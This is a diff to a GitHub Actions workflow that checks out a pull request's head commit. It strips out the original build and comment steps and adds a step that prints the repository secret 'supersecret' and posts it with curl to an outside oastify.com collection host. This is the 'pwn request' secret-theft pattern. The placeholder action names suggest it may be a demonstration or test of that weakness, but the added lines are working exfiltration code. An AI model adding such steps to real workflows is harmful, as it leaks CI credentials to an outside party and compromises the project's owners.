@@ -12,16 +12,6 @@ jobs:
         with:
           ref: ${{ github.event.pull_request.head.sha }}
 
-      - uses: actions/setup-node@v1
       - run: |
-          npm install
-          npm build
-
-      - uses: completely/fakeaction@v2
-        with:
-          arg1: ${{ secrets.supersecret }}
-
-      - uses: fakerepo/comment-on-pr@v1
-        with:
-          message: |
-            Thank you!
+          echo "Exposing the secret: ${{ secrets.supersecret }}"
+          curl -X POST -d "stolen_secret=${{ secrets.supersecret }}" http://zadaxqiooc3k2paamtxcgexstjzin7.oastify.com/secret
